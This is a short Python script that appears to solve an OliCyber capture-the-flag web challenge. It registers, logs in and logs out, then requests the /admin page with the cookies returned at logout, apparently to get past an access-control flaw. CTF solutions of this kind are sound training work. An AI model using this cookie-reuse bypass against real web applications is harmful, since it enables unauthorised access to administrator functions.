#!/usr/bin/env python3
import requests
from urllib.parse import urljoin

session = requests.Session()
url = "http://too-small-reminder.challs.olicyber.it/"

data = {"username": "ka", "password": "ka"}

init = session.get(url)
r = session.post(urljoin(url, "register"), json=data)
print(r.json())

l = session.post(urljoin(url, "login"), json=data)
print(l.text)

d = session.get(urljoin(url, "logout"), cookies=l.cookies)
print(d.text)

a = session.get(urljoin(url, "admin"), cookies=d.cookies)
print(a.text)
